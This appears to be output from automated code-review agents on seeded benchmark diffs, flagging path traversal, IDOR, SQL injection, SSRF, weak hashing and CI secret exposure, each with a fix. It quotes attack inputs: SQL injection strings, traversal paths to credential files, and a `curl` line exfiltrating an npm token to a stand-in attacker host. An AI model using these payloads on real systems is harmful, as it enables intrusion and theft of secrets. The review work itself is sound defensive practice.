If the provider client raises instead of returning a status, the exception propagates as an unhandled 500, which is also not the behaviour the previous decorator produced (a well-formed rate-limit response). Either inspect the send result / catch the provider's throttle error and reflect it in the return value, or keep a local limiter so the endpoint controls its own back-pressure rather than inferring it from an unchecked downstream call.

findings.title: No test guards against reintroducing or missing rate limiting
findings.body: The diff removes the `@rate_limit("5/hour")` decorator from `request_reset`. No test file is included, so there is no evidence any test ever asserted rate-limiting behavior on this endpoint, nor any test that would fail now that it's gone. If the removal is wrong (e.g., the email provider's throttling is insufficient), nothing in the visible change set would catch it.

findings.title: Preview path skips _confined(), allowing arbitrary file read
findings.body:
The existing download path on line 14 resolves the user-supplied `name` through `_confined(name)` before opening it. `read_export_preview` instead does `os.path.join(EXPORT_ROOT, name)` with no validation. Because `os.path.join` collapses to the argument when it is absolute, a `name` of `/etc/passwd` returns that path verbatim, and a relative `../../etc/passwd` traverses out of `EXPORT_ROOT` the same way. The function then opens and returns the first `limit` bytes of whatever it landed on. The PR description says the preview path "reuses the same layout as download" — it reuses the layout but drops the containment check that makes the layout safe. Route `name` through `_confined(name)` exactly as line 14 does.

_Also raised by the security agent:_ read_export_preview skips _confined(), allowing path traversal

findings.title: Public function lacks documented path safety contract
findings.body: `read_export_preview` is a public function that accepts a `name` parameter but does not confine the path using `_confined()`, unlike the existing `read_export_file` on line 14. A caller reading the parallel function signatures would reasonably expect both to be equally safe. This represents an undocumented public API contract: callers cannot tell from the function name or signature whether path traversal attacks are possible. The function should either (1) apply `_confined(name)` to match the pattern, (2) receive prominent documentation stating it does not confine paths and require pre-validated input, or (3) be private (prefixed with `_`) to signal it is internal.

findings.title: No test covers path confinement for read_export_preview
findings.body: read_export_preview builds its path via os.path.join(EXPORT_ROOT, name) directly, unlike the existing read path which calls _confined(name) (line 14). If this omission is a bug (allowing path traversal via `name`), nothing in the diff or visible test suite would catch it — there is no test exercising this function with a traversal-style name (e.g. '../secret') to confirm it is rejected or confined the same way as the download path.

findings.title: Ownership check removed from bulk_export enables cross-tenant IDOR
findings.body:
`bulk_export` takes `report_ids` from the caller, loads each `Report` by ID, and now serialises all of them with no tenant check. The `require_owner(user, report)` loop that enforced `obj.tenant_id == user.tenant_id` was deleted along with its import, so any authenticated user can enumerate or guess report IDs and read another tenant's data. Authentication via `current_user` is not authorisation.

Restore the check. If the loop was the performance problem, keep the invariant and fix the cost instead — e.g. fetch with a tenant-scoped query (`Report.filter(id__in=report_ids, tenant_id=user.tenant_id)`) and reject/omit any requested ID that does not come back, which is one query rather than N and preserves the control.

_Also raised by the correctness agent:_ bulk_export no longer enforces per-object tenant ownership

findings.title: Public endpoint lacks contract docs; authorization semantics changed
findings.body: The `bulk_export` function is a public API endpoint that previously enforced per-object authorization (require_owner) but now returns any reports passed to it without ownership verification. There is no docstring documenting what the function does or who is permitted to access each report. A caller would have no way to know whether they can safely pass arbitrary report IDs or whether the endpoint will only return reports they own. The repository context shows that `require_owner` is the documented pattern for 'every object read or mutation of another tenant's data', so removing it without updating documentation creates a stale-contract gap.

findings.title: No test guards ownership enforcement in bulk_export
findings.body: The removal of the per-report require_owner(user, report) check is not accompanied by any test change. If bulk_export previously had a test asserting that requesting another tenant's report_ids raises Forbidden, that test would need to fail here — but no test file is present in this diff, so either such a test doesn't exist or it was silently left out of this PR. Either way, nothing in the shown diff would catch this behavior change (cross-tenant reports now being returned instead of raising Forbidden). A test exercising bulk_export with report_ids belonging to a different tenant, asserting Forbidden is raised (or now failing because it isn't), is needed.

findings.title: SQL injection via f-string interpolation in search_customers
findings.body:
`search_customers` interpolates `term` and `status` straight into the SQL text and then calls `execute(sql)` with no params, so the values are parsed as SQL rather than bound as data. A value such as `status = "x' OR '1'='1"` returns every customer row, and `' UNION SELECT ...--` or a stacked statement (driver permitting) reads or mutates arbitrary tables. The single-quote context around both placeholders means an attacker only needs one quote character to break out.

Use the same parameterised form as `get_customer` on line 5, keeping the wildcards in the bound value rather than the SQL:

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))
```

If `status` is meant to be one of a fixed set, also validate it against an allowlist.

findings.title: search_customers bypasses parameterisation contract of execute()
findings.body:
`billing.db.execute` documents that `params` "must carry every caller value", and the sibling `get_customer` on line 5 follows that by passing `%s` placeholders plus a tuple. `search_customers` instead interpolates `term` and `status` directly into the SQL text on line 9 and then calls `execute(sql)` on line 10 with no params, so the driver never escapes anything.

Two concrete consequences:
1. Any caller value containing a single quote (e.g. a customer named `O'Brien`) terminates the string literal and the query fails or changes meaning — this is reachable with entirely legitimate input, not just hostile input.
2. Because the values are concatenated, a crafted `term` or `status` can append arbitrary SQL.

Fix by keeping the wildcards in the parameter value rather than the SQL text:

    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))

findings.title: Public function signature contradicts its actual parameter safety
findings.body: The `search_customers` function appears to be a public API (exported at module level, named without underscore prefix) but has no docstring explaining its contract. More critically, its signature `search_customers(term, status)` mirrors the safe pattern established by `get_customer()` above it, which passes parameters through the `execute()` helper as documented in db.py: "Run a parameterised query. `params` must carry every caller value." However, `search_customers` builds an f-string and calls `execute(sql)` with no params argument, violating the documented contract that parameters must be carried separately. A caller reading the existing code and docstrings would reasonably expect this function to follow the same safety pattern and would be misled by the signature.

findings.title: search_customers has no test exercising its query construction
findings.body: The new search_customers function builds SQL via f-string interpolation and calls execute(sql) with no params tuple, diverging from the parameterised pattern used by get_customer. There is no test in this diff that calls search_customers and checks the SQL/params passed to execute, so a wrong or unsafe query construction would not be caught. If the surrounding repo tests get_customer's call to execute (asserting the SQL string and params tuple), an equivalent test is missing here.

findings.title: verify_endpoint bypasses the ALLOWED_HOSTS check enforced on line 8
findings.body:
The existing send path validates the destination host against `ALLOWED_HOSTS` (lines 8-9) before issuing the request. `verify_endpoint` takes an arbitrary caller-supplied `url` and issues `requests.get` with no such check, so the module's stated invariant — "we only talk to allowed hosts" — no longer holds for any caller that reaches this function. Since the PR description says tenants register the URL, a tenant-controlled value reaches an outbound GET unfiltered (internal addresses, link-local metadata endpoints, file-ish schemes handled by adapters).

Apply the same host extraction and `ALLOWED_HOSTS` membership test before the request, and pass `allow_redirects=False` — `requests` follows redirects by default, so even a validated host can redirect the client to an unvalidated one, re-opening the same hole.

_Also raised by the security agent:_ SSRF: verify_endpoint skips the ALLOWED_HOSTS check used for delivery

findings.title: verify_endpoint has no test coverage
findings.body: The new verify_endpoint function performs an unrestricted GET request and returns a status code, but no test exercises it. Unlike the sibling function above (lines 8-10) which enforces ALLOWED_HOSTS, this function has no host validation at all, and no test would catch it if that behavior is wrong or if validation is later added/removed incorrectly. Add a test asserting verify_endpoint's behavior for allowed and disallowed hosts, and its return value on success/failure.

findings.title: verify_endpoint raises instead of reporting an unreachable endpoint
findings.body: A function named `verify_endpoint` returning `status_code` reads as "tell me how the endpoint responded", but the unreachable case — DNS failure, refused connection, or the 5s timeout expiring — propagates `requests.exceptions.RequestException` out of the function. Callers written against the int return shape will not be guarding for that, and the most common real-world outcome of verifying a freshly registered tenant URL is precisely a connection error. Either catch `requests.RequestException` and return a sentinel (e.g. `None`) or document that the function raises, so callers handle both shapes deliberately.

findings.title: Customer invoices bucket created with all public access blocks disabled
findings.body:
`aws_s3_bucket.invoices` (`acme-customer-invoices`) is paired with an `aws_s3_bucket_public_access_block` that sets all four guards to `false`: `block_public_acls`, `block_public_policy`, `ignore_public_acls`, `restrict_public_buckets`. This turns off the account-independent safety net that prevents a public ACL or bucket policy — applied later by any principal with `s3:PutBucketPolicy`/`s3:PutBucketAcl`, or by a console misclick — from actually taking effect. The bucket name strongly suggests it holds customer invoices (PII, billing data), so the blast radius of any subsequent public grant is unauthenticated read of customer financial records by anyone on the internet.

For a non-public data bucket the block should be the default-deny form:

```
resource "aws_s3_bucket_public_access_block" "invoices" {
  bucket                  = aws_s3_bucket.invoices.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}
```

Separately, this resource is out of scope for the stated change ("public assets bucket for the marketing site") — a data bucket with public access enabled should not ride along in a marketing-assets PR. Consider also adding server-side encryption and versioning before this holds invoice data.

_Also raised by the correctness agent:_ PR adds an unrelated invoices bucket with all public-access blocks off

findings.title: HMAC compared with `==` instead of hmac.compare_digest
findings.body:
`verify_acmepay` computes the expected HMAC-SHA256 hex digest and then compares it to the caller-supplied `header` using `==`. CPython's string equality short-circuits on the first differing byte, so the comparison time leaks a prefix-match oracle for the expected digest. An attacker who can submit many webhook requests with forged signature headers can use that oracle to recover the expected digest byte-by-byte and forge an accepted AcmePay webhook without knowing `secret`.

Fix: mirror the existing Stripe helper and use `return hmac.compare_digest(expected, header)`. Note `compare_digest` requires both operands to be str of ASCII-only characters (or bytes), so guard/normalise `header` if it may be `None` or non-ASCII.

_Also raised by the correctness agent:_ verify_acmepay compares MAC with == instead of compare_digest

findings.title: New verify_acmepay function has no test coverage
findings.body: The new verify_acmepay function (lines 10-12) is added with no accompanying test in this diff. Notably it diverges from verify_stripe by using `expected == header` instead of `hmac.compare_digest`, a behavioral difference that a test comparing both functions' outputs/timing characteristics would likely have caught. Since no test exercises this function at all, this defect (or any future regression in it) would go undetected.

findings.title: 500 handler leaks exception text and full traceback to the client
findings.body:
`handle()` previously returned a fixed `{"error": "internal error"}` body and relied on `log.exception` (line 8) for operator visibility. It now serialises `str(exc)` and `traceback.format_exc()` into the HTTP response body.

The traceback exposes absolute source paths, module and function names, the frameworks and versions in use, and the source line of each frame. Exception messages routinely embed operational detail an attacker cannot otherwise obtain: database errors carry table and column names and fragments of the failing SQL, driver errors carry connection strings including host and often the username, `KeyError`/`ValueError` from request parsing echo back internal field names, and `FileNotFoundError`/`PermissionError` disclose filesystem layout. Since anyone who can reach the endpoint can trigger errors by sending malformed input, this gives an unauthenticated attacker a cheap oracle for mapping internals before a targeted attack.

Keep the generic client-facing body and leave the detail in the log, where it already goes. If on-call needs to correlate without SSHing in, return a correlation id and log it alongside the traceback:

```python
def handle(exc):
    error_id = uuid.uuid4().hex
    log.exception("request failed", extra={"error_id": error_id})
    return {"error": "internal error", "error_id": error_id}, 500
```

If verbose output is genuinely wanted for local work, gate it on an explicit debug flag that is off by default in production config rather than emitting it unconditionally.

_Also raised by the correctness agent:_ format_exc() yields "NoneType: None" outside an active except block

_Also raised by the correctness agent:_ 500 response body shape and value changed for existing consumers

findings.title: No test verifies error response now includes exception/traceback
findings.body: The change alters the public contract of handle() from a generic error message to one that includes str(exc) and a full traceback. No test in this diff checks the returned dict's contents, so a regression (e.g. accidentally reverting to the generic message, or a future change that strips the traceback) would not be caught. Add a test asserting that handle(exc) returns a dict containing the exception message and traceback text, and the 500 status code.

findings.title: Reset passwords hashed with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` produces a single-round, unsalted MD5 digest of a user password. MD5 is a fast hash: commodity GPUs do billions of guesses per second, so an attacker who obtains the stored value (SQL injection, backup leak, replica access) recovers the plaintext of anything but a very high-entropy password, and the absence of a salt makes the digests trivially rainbow-table-able and lets identical passwords be spotted across accounts. The same module already demonstrates the correct primitive one function above: `bcrypt.hashpw(raw.encode(), bcrypt.gensalt())`.

If this value is a stored password (or a password-equivalent verifier), use `hash_password`/bcrypt for it too. If what is actually wanted is a one-time reset *token*, do not derive it from the password at all — generate it with `secrets.token_urlsafe()`, store a SHA-256 of the token, give it an expiry, and compare with `hmac.compare_digest`.

findings.title: Undocumented security downgrade in password reset hashing
findings.body: The function `hash_reset_password` uses MD5 hashing for password material, which is cryptographically broken and unsuitable for password storage. This contradicts the security model of the module established by `hash_password`, which correctly uses bcrypt. A caller reading only the function name and signature could reasonably assume it provides equivalent security to `hash_password`, but it does not. Either: (1) add a docstring explicitly documenting that this is intentionally weaker and explaining the threat model (e.g., if reset tokens are short-lived); (2) if MD5 is truly wrong, use bcrypt; or (3) if this is for a different purpose (e.g., generating reset tokens rather than storing passwords), rename it and document that purpose clearly.

findings.title: Reset hash format is incompatible with the bcrypt hash it sits beside
findings.body: `hash_password` returns a bcrypt modular-crypt string (`$2b$...`), while `hash_reset_password` returns a 32-char MD5 hex digest. If both write to the same stored-password column, any verifier using `bcrypt.checkpw` will raise or return False on a reset-set password, locking the user out; conversely a verifier that falls back to comparing MD5 digests silently accepts an unsalted, trivially reversible hash for every account. Either way the two functions cannot share a storage field. Make the reset path call `hash_password` (bcrypt with a fresh salt) so the stored format stays uniform, or, if this value is genuinely a short-lived reset *token* digest rather than a password hash, rename it and keep it out of the password column.

findings.title: No test coverage for password-reset hashing behaviour
findings.body: hash_reset_password is a new security-relevant function (used in a password reset flow) but no test exists to verify its output format, determinism, or algorithm choice. If this function were changed or broken in a way that altered its behavior, nothing would catch it.

findings.title: No test coverage for checksum utility
findings.body: checksum() reads a file and hashes its contents but has no test verifying correct behavior (e.g., correct hash for known input, handling of missing files). A regression here would go unnoticed.

findings.title: pull_request_target runs forked PR code with repo secrets
findings.body:
`pull_request_target` runs in the context of the base repository: the job gets a `GITHUB_TOKEN` with write permissions and full access to repository secrets, and — unlike `pull_request` — it runs automatically for pull requests from forks with no maintainer approval.

Lines 11–12 then explicitly check out `github.event.pull_request.head.sha`, i.e. the attacker-authored commit, into that privileged workspace. Line 13 executes `./scripts/measure.sh` from that same checkout. Since the script file itself comes from the fork, an external contributor can open a PR that replaces `scripts/measure.sh` (or anything it sources, e.g. a package manifest with an install hook) with arbitrary commands.

Lines 14–15 hand that arbitrary code `secrets.NPM_TOKEN` directly in its environment, so a one-line change such as `curl -d "$NPM_TOKEN" attacker.example` exfiltrates the publish token on the first PR. The privileged `GITHUB_TOKEN` in the runner environment is equally reachable and allows pushing to the repository.

To give forks the same CI signal safely, either:
- revert to `on: pull_request` (secrets are not available to fork runs, so `NPM_TOKEN` must be removed or the token-needing step split out); or
- keep `pull_request_target` but do **not** check out or execute any fork-controlled content — check out the base ref only, run no scripts from the PR, and use the `workflow_run` pattern (untrusted build without secrets, then a separate privileged job that only consumes uploaded artifacts) if privileged post-processing is required. At minimum add an explicit `permissions:` block set to `contents: read` and drop `NPM_TOKEN` from any step that touches fork code.

_Also raised by the correctness agent:_ pull_request_target checks out fork code and runs it with NPM_TOKEN

findings.title: Stated goal does not require pull_request_target
findings.body: The PR description says the switch is needed "so external contributors get the same CI signal", but `on: pull_request` already triggers for pull requests opened from forks — it simply runs with a read-only `GITHUB_TOKEN` and no secrets. If the size check was not running for forks before, the cause is something else (e.g. the job needs `NPM_TOKEN`, which was presumably absent before this diff added it on line 15). Changing the trigger does not fix the stated problem and instead introduces the privileged-context exposure noted separately; the actual dependency on a secret should be addressed directly.

findings.title: json.dumps narrows accepted context values vs. the old tuple key
findings.body:
The previous key was `tuple(sorted(context.items()))`, which accepted any *hashable* (and orderable-key) context — `datetime`, `Decimal`, `UUID`, enums, small custom objects, tuples as values. `json.dumps` accepts only JSON-serialisable values and raises `TypeError: Object of type X is not JSON serializable` for everything else. Any existing caller passing such a context now fails at the cache layer before `_render` is ever reached, turning a working render into an exception.

If non-JSON contexts are possible, pass `default=repr` (or `default=str`) to `json.dumps`, or keep the tuple key and hash `repr` of it — and add a test covering a non-JSON-serialisable value.

findings.title: No test for JSON-driven key collisions across distinct context types
findings.body: The new key is `hashlib.md5(json.dumps([template_source, context], sort_keys=True)...)`. json.dumps silently collapses distinguishable Python types into the same JSON representation (e.g. a tuple and a list, or None vs. missing key in some structures), so two contexts that are meaningfully different in Python can now hash to the identical cache key and incorrectly return a cached render. The previous tuple-based key was hashable-object-based and did not have this specific collapsing behavior. None of the added tests (which only use plain dict reordering and simple int values) would catch this regression.

findings.title: New tests assume the module-level _CACHE is reset per test
findings.body: `_CACHE` is a module-level dict that the code never clears. `test_different_context_renders_again` renders `("{{ a }}", {"a": 1})`, which the earlier tests in this file already cached; unless the `counter` fixture clears `render.cache._CACHE` (not just the render counter), the first call here is a cache hit and the assertion `counter.renders == 2` fails — or passes only because of test ordering. Please make the fixture clear `_CACHE`, or use context values unique to each test.

findings.title: MD5 used to derive cache key; prefer sha256 (and usedforsecurity=False)
findings.body:
The cache key is `hashlib.md5(payload).hexdigest()`. Two distinct (template_source, context) pairs that collide return the same cached render, so a collision is a cache-poisoning / cross-request output-confusion primitive rather than a mere hash-quality nit. MD5 collisions are cheap to construct; second-preimage against an existing victim entry is not, so exploitation would require an attacker to control *both* colliding inputs and get one of them rendered and cached by another principal. I cannot see where `template_source` or `context` originate \u2014 neither the caller nor any request handler is in this diff or in the retrieved context \u2014 so I cannot show that path is reachable.

Cost to remove the question entirely is one token: use `hashlib.sha256(payload.encode()).hexdigest()`. As a secondary practical point, bare `hashlib.md5(...)` raises `ValueError` on FIPS-enabled OpenSSL builds; if this may run in such an environment, either move to sha256 or pass `usedforsecurity=False`.

findings.title: directory is no longer shell-expanded; multi-path/glob callers now fail
findings.body: The old implementation interpolated `directory` into a shell command line, so a caller could legitimately pass `"/srv/data/*"`, `"/srv/a /srv/b"`, or `"~/data"` and rely on the shell to glob/split/expand it. With a list argv and `shell=False`, the whole string is handed to `tar` as one literal path; tar will fail with "No such file or directory" and, because `check=True`, the call raises `CalledProcessError` instead of producing an archive. If any caller passes anything other than a single literal path, this is a silent behavioural break at runtime rather than at import time. Worth grepping call sites; if multi-path support is needed, accept a sequence of directories and extend the argv list instead.

findings.title: `directory` reaches tar unvalidated — possible arbitrary-path archiving
findings.body:
`name` is now constrained by `SAFE_NAME`, but `directory` is passed straight through to tar as the positional source path. The `--` on line 12 correctly prevents it from being parsed as an option, so this is not argument injection; the remaining exposure is that whoever controls `directory` chooses what gets archived. If that value originates from a request parameter, a caller could pass `/etc`, `/root/.ssh` or `/proc/self/environ` and then read the resulting `/exports/<name>.tar.gz`, turning this into an arbitrary-file-read primitive.

Suggest resolving the path and asserting it stays under an expected export root (e.g. `os.path.realpath(directory)` must start with the allowed base), mirroring the allowlist treatment `name` already gets. `realpath` rather than `abspath` also closes the symlink case.

I cannot see the caller in this diff or in any retrieved context, so if `directory` is only ever a server-side constant this is a defence-in-depth note rather than a live bug.

findings.title: SAFE_NAME rejects dotted/dated names the old version accepted
findings.body: `[A-Za-z0-9_-]{1,64}` excludes `.`, spaces and `/`. Archive names like `nightly.full`, `tenant42.2024-01-01` or `customers/acme` were accepted before (they were just interpolated into the command) and now raise `ValueError` at the top of the function. This turns a previously working call into a hard failure for every caller using a dotted or namespaced name. If those names are in use, widen the pattern to allow `.` while still forbidding `..` and `/`, or normalise the name rather than rejecting it. Separately, a non-`str` `name` (e.g. an int or `None` from a caller) raises `TypeError` from `fullmatch` rather than the documented `ValueError`.

findings.title: Shell-safety test only checks the shell flag, not argv shape
findings.body: test_runs_without_a_shell asserts spy.last_call.kwargs['shell'] is False but never inspects spy.last_call.args to confirm the command was actually passed as a list (['tar', '-czf', ...]) rather than a single interpolated string. The core fix here is switching from a shell string to argv-list invocation; a regression that keeps shell=False but reassembles the command as one string (e.g. subprocess.run(f'tar ...', shell=False)) would pass this test while reintroducing the exact class of risk (path/arg confusion) the PR is meant to close.

findings.title: test_renders_empty_invoice has no assertion
findings.body:
The test calls render() but never checks the result. If render() raises on empty invoices, no lines are output when they should be, or garbage is returned, this test still passes. Add an assertion on the actual return value, e.g. assert render(Invoice(lines=[])) == "" or whatever the expected empty-invoice output is.

_Also raised by the correctness agent:_ test_renders_empty_invoice asserts nothing about the result

findings.title: test_renders_line_items only asserts mock call_count, not output
findings.body: This test patches out format_line entirely and only checks that it was called twice; it never checks what render() actually produces. A refactor that calls format_line a different number of times, or a bug where the formatted lines are dropped/misplaced in the final output, would not be caught. Assert on render()'s actual return value instead of (or in addition to) the mock call count.

findings.title: Half-way rounding test deleted, not updated; boundary now untested
findings.body:
The only test covering the exact half-way case (`Decimal("2.345")`) is removed, and the diff contains no change to `round_cents` itself — the PR is a test deletion only. Two problems follow:

1. If the rounding behaviour really did change (half-to-even to something else), the new expected value should be asserted (e.g. `round_cents(Decimal("2.345")) == Decimal("2.35")`), not dropped. As it stands the remaining `test_rounds_up_above_half` only exercises values strictly above the midpoint, so the tie-breaking rule — the part most likely to regress and the part that matters for money — has no coverage at all.
2. If the implementation was not changed, the deleted test was reporting a genuine defect and removing it hides it.

Please restore the case with the intended expected value, and include the `round_cents` change in this PR so the assertion and the behaviour land together.

_Also raised by the tests agent:_ Deleted rounding test has no replacement covering the fix

findings.title: Mock patches wrong target; real deliver() is still called
findings.body:
`notify/sender.py` does `from notify.transport import deliver`, so the name `deliver` is bound in the `notify.sender` module namespace at import time. Patching `notify.transport.deliver` rebinds the attribute on the transport module only — `send_with_retry` continues to call the original function object. This test therefore performs three real delivery attempts and its assertion passes or fails for reasons unrelated to the retry logic it claims to cover (and may be slow, flaky, or have side effects). Patch `notify.sender.deliver` instead, exactly as the existing test on line 2 does, and consider asserting the mock was called three times so the retry count is actually verified.

_Also raised by the tests agent:_ Mock patches wrong target; test doesn't verify retry logic

findings.title: Test contradicts documented patching requirement
findings.body: The test patches `notify.transport.deliver`, but the module's own docstring (in `notify/sender.py` lines 3-4) explicitly states that `deliver` is bound into the module's namespace at import time, so patching `notify.transport.deliver` will not affect it. The patch target should be `notify.sender.deliver` to match the documented behavior and the pattern shown in the first test on line 2. This test will not actually test the retry path as intended because the patch is ineffective.

findings.title: csv_rows never calls csv_escape, emitting malformed CSV
findings.body: `csv_rows` joins raw `str(...)` values with commas and never routes them through `csv_escape`, which is added three lines below in the same module. Any cell containing a comma or a double quote produces a line with the wrong number of fields, silently corrupting the export for downstream parsers. Wrap the value: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`. The same applies to `csv_header`, whose column names are also unescaped.

findings.title: csv_rows joins fields without applying csv_escape
findings.body: `csv_rows` renders each field with `str(r.get(c, ""))` and joins on `,`, bypassing the `csv_escape` helper defined immediately below it. Any field value containing a comma or a double quote will split into extra columns or corrupt quoting in the emitted line, letting whoever controls a row value inject arbitrary additional fields into the exported record (and, since the output is CSV consumed by spreadsheet tools, control the leading character of a cell). Fix: apply `csv_escape(str(r.get(c, "")))` inside the comprehension. Consider also neutralising values that begin with `=`, `+`, `-` or `@` if the export is opened in a spreadsheet, since `csv_escape` does not address that either.

findings.title: csv_escape does not quote newlines and raises on non-string input
findings.body: RFC 4180 requires quoting for values containing CR or LF as well as commas and quotes; a cell with an embedded newline passes through unquoted here and breaks the record into two rows on parse. Add `"\n" in value or "\r" in value` to the condition. Separately, the membership tests assume `value` is a `str`, so `csv_escape(5)` raises `TypeError: argument of type 'int' is not iterable` — coerce with `value = str(value)` first if callers may pass non-strings (the sibling `csv_rows` does call `str(...)`, suggesting they can).

findings.title: New exporter functions added without any tests
findings.body: The repository has a test for csv_header but none of the new functions introduced in this PR (csv_rows, csv_escape, dump_streaming, dump_pretty, margins_for, usable_width) have tests. These include non-trivial logic (CSV quoting rules, chunking boundaries, margin arithmetic) that could silently regress. Add unit tests mirroring the existing test_csv_header_matches_columns style for each of these functions.

findings.title: Date comparison against wall clock flakes across UTC midnight
findings.body:
`issue_token()` is called on line 10 and `datetime.now(timezone.utc)` is evaluated separately on line 11. If the first call happens at 23:59:59.9xx UTC and the second lands after the rollover, the two `.date()` values differ and the assertion fails for reasons unrelated to the code under test. The same wall-clock dependence affects line 12, where `is_expired(token.expires_at)` is resolved against the ambient current time rather than a fixed instant.

The test directly above (lines 4-6) already shows the deterministic pattern: build a fixed `issued` instant and pass `now=` explicitly. Follow it here \u2014 either freeze the clock, or capture `now = datetime.now(timezone.utc)` once and pass it to both the date comparison and `is_expired(..., now=now)` so a single instant drives the whole assertion.

_Also raised by the tests agent:_ New test depends on real time, unlike the pattern used above

findings.title: No test covers the expired-coupon rejection path
findings.body: apply_coupon now raises CouponExpired when coupon.expires_at is in the past, but the only test updated (test_apply_coupon_reduces_total) uses a coupon expiring tomorrow. There is no test that passes an already-expired coupon and asserts CouponExpired is raised. If the comparison logic were inverted, or the exception were never raised, no test would fail.

findings.title: Public function contract missing: apply_coupon now requires non-expired coupon
findings.body: The `apply_coupon` function is a public API that now raises `CouponExpired` if the coupon has passed its expiry date (line 9). A caller cannot infer this requirement from the function signature alone and will be surprised by the exception. The function needs a docstring documenting the new precondition and the exception it raises.

findings.title: expires_at is compared unguarded: None or naive datetime raises TypeError
findings.body:
`coupon.expires_at < datetime.now(timezone.utc)` assumes `expires_at` is always present and always timezone-aware. Two reachable inputs break it:

- A coupon with no expiry (`expires_at is None`) raises `TypeError: '<' not supported between instances of 'NoneType' and 'datetime.datetime'` instead of applying cleanly.
- A coupon whose `expires_at` was stored naive (no tzinfo) raises `TypeError: can't compare offset-naive and offset-aware datetimes`.

Neither surfaces as `CouponExpired`, so callers catching that exception will see an unhandled `TypeError` instead. Suggest guarding explicitly, e.g. `if coupon.expires_at is not None and _as_utc(coupon.expires_at) < datetime.now(timezone.utc)`, and normalising naive values at the boundary.

findings.title: Blocking requests.get inside async function stalls the event loop
findings.body:
`fetch_plan_limits` is a coroutine but calls `requests.get`, which is synchronous. While it waits (up to the 5s timeout, longer if DNS/connect hangs before the timeout applies to the full operation), the event loop cannot run any other task, so every concurrent request handler in the process is stalled. The function also contains no `await`, so marking it `async` buys nothing while making the blocking behaviour invisible at the call site.

Use the `httpx.AsyncClient` pattern already established by `fetch_plan` on lines 5-7 — accept a client and `await client.get(...)` — or, if a client cannot be threaded through, wrap the sync call in `asyncio.to_thread(...)`. If the async form is adopted, the `import requests` on line 2 can be dropped.

findings.title: No test covers fetch_plan_limits or its blocking-call behavior
findings.body: fetch_plan_limits is declared async but calls the synchronous `requests.get`, which blocks the event loop — exactly the kind of regression this eval category (cor-async-blocking-call) is meant to catch. No test exists in this diff that exercises this function, so nothing would fail if this blocking call were introduced or reintroduced later (e.g. via a refactor swapping libraries). A test asserting the call is non-blocking (or using an async HTTP client with a mocked transport) would catch this.

findings.title: Unencoded tenant_id interpolated into internal billing URL path
findings.body:
`fetch_plan_limits` builds the request URL with an f-string: `f"https://billing.internal/limits/{tenant_id}"`. `requests`/`urllib3` do not strip dot segments or escape `?`, `#` or `/` from a path component, so a `tenant_id` such as `../../admin/keys` or `1?force=true` reaches the internal billing service as a different path or with injected query parameters. Since `billing.internal` is an unauthenticated-from-the-outside internal host, this turns a tenant identifier into a partial request-forgery primitive against that service.

Fix: validate `tenant_id` against the expected shape (e.g. UUID or integer) before use, or at minimum percent-encode it with `urllib.parse.quote(str(tenant_id), safe="")`. The same pattern exists in the pre-existing `fetch_plan` on line 6 and deserves the same treatment.

findings.title: Bare `except:` swallows BaseException and logs nothing
findings.body:
`except:` with no exception class catches `BaseException`, so `KeyboardInterrupt`, `SystemExit` and `GeneratorExit` raised while `_client.send` is in flight are converted into a normal `return None`. That makes the process ignore Ctrl-C / shutdown signals during a metrics push and can mask a `SystemExit` from surrounding shutdown logic. The PR description says "catch and log", but no logging happens here \u2014 every transport failure becomes invisible, so a metrics pipeline that is 100% broken looks identical to one that is healthy.

Suggested: `except Exception as exc: logger.warning("metrics push failed", exc_info=exc); return None` \u2014 narrow the catch to `Exception` (or the specific client/transport error) and emit the log the description promises.

_Also raised by the security agent:_ Bare except silently drops all telemetry failures (no log)

findings.title: Bare except contradicts PR intent to log failures
findings.body: The PR description states 'catch and log, then continue', but the code uses a bare `except:` that catches all exceptions and returns None without any logging. This means the actual behavior (silent failure) directly contradicts the documented intent (log the failure). Either add logging to match the stated behavior, or update the PR description. Additionally, the function's public contract is now unclear: callers cannot tell from the signature alone whether None means success or failure.

findings.title: No test covers new exception-swallowing behavior in push_metrics
findings.body: The change makes push_metrics catch all exceptions and return None instead of propagating, which is a real behavior change (failures become silent). There is no test in this diff verifying that (a) an exception from _client.send is caught and None is returned, or (b) any logging occurs. If this try/except were removed or mis-scoped, no test would fail.

findings.title: try_consume reads and writes _counters without _lock, losing updates
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` at line 15, then yields to the event loop at line 18 (`await asyncio.sleep(0)`), then unconditionally assigns `_counters[tenant] = current + cost` at line 19. Any increment applied by a concurrent `consume` or `try_consume` during that await is overwritten, because the write uses the stale `current` snapshot rather than re-reading. Two coroutines each consuming 600 against a LIMIT of 1000 can both read 0, both pass the check, and both write 600 — the counter ends at 600 instead of 1200, and the limit is silently bypassed by an arbitrary amount under load.

This also breaks the invariant the existing `consume` establishes: it mutates `_counters` only while holding `_lock` (lines 9-11), and that guarantee is worthless once another writer touches the same dict unlocked.

Fix by wrapping the whole read-check-write sequence in `async with _lock:`, and ideally by making the update read-modify-write (`_counters[tenant] = _counters.get(tenant, 0) + cost`) so it is correct even if the critical section is later split.

_Also raised by the security agent:_ try_consume checks the limit outside the lock — rate limit is bypassable

_Also raised by the security agent:_ Counters never decay and _counters is unbounded per tenant key

findings.title: No test coverage for try_consume's check-then-act logic
findings.body: try_consume reads _counters.get(tenant, 0) without holding _lock, then awaits asyncio.sleep(0) (a yield point), then writes back current + cost. Under concurrent calls for the same tenant this is a classic check-then-act race that can allow the limit to be exceeded — which is directly relevant given this PR is literally about fixing a starvation/race scenario. There is no test file in this diff exercising try_consume at all, so neither the happy path (limit enforcement) nor the concurrent race would be caught by any test.

findings.title: Return shape change breaks tuple-unpacking caller in reports/weekly.py
findings.body: `lookup_user` now returns `{"name": ..., "email": ..., "tier": ...}` instead of a `(name, email)` tuple. The existing caller `render_row` in reports/weekly.py does `name, email = lookup_user(user_id)`. Unpacking a dict iterates its keys, so with three keys this raises `ValueError: too many values to unpack (expected 2)` on every call — and even if it had exactly two keys it would bind the key strings, not the values, producing silently wrong output. Either update every caller (`u = lookup_user(...); u["name"], u["email"]`) in the same change, or return a `NamedTuple`/`dataclass` that preserves tuple unpacking while adding `tier`.

